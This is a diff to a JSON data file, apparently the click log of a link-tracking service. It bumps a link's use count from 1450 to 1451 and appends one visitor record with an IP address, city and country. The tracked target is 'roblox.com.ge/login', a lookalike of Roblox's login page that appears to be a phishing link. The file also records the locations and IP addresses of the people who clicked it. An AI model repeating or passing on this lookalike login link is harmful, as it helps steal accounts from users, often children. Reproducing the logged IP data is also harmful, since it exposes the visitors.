@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1450,
+    "useCount": 1451,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11768,6 +11768,14 @@
         "city": "Polanco",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777434634883,
+        "ip": "96.255.45.44",
+        "country": "United States",
+        "city": "Manassas",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
